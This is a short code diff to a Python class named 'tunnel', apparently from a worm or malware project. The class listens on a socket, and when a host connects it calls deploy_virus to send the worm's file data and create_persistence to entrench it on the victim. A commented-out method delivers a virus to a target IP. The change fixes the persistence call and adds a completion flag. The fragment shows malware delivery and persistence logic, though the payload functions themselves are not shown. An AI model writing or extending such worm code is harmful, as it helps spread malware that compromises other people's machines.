@@ -13,6 +13,7 @@ class tunnel(threading.Thread):
         self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.sock.bind((self.lhost,self.lport))
         self.sock.listen(5)
+        self.complete = False
         print("Establishing Tunnel - listening on port {}".format(self.lport))
         self.connection = {}
         super().__init__()
@@ -25,7 +26,8 @@ class tunnel(threading.Thread):
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
         self.deploy_virus(self.worm.getfiledata(),conn)
-        self.create_persistence(self,conn)
+        self.create_persistence(conn)
+        self.complete = True
     
     
     def sent_command(self, command, conn):
@@ -37,6 +39,8 @@ class tunnel(threading.Thread):
         response = conn.recv(1024).decode()
         return response
     
+    def get_done(self):
+        return self.complete
     # def delivery_virus(self, target_ip, virus):
     #     self.get_connection(target_ip).sendall(virus)
 
